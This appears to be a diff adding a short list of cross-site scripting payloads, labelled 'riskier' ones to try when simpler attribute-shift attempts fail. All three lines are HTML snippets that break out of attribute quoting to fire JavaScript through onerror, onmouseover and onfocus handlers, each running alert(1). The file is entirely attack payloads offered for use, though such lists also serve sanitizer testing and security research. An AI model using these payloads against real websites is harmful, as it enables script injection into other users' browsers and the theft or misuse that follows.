@@ -1,0 +1,7 @@
+# Riskier payloads that may span elements or content
+# Use when simpler attribute-shift attempts fail
+
+<div><img src='attribute="">"x' onerror="alert(1)"></div>
+<a title='attribute="'><b id="' x='y' onmouseover=alert(1)">T</b></a>
+<p data-x='attribute="'>"x' tabindex=1 onfocus=alert(1) y='z'</p>
+
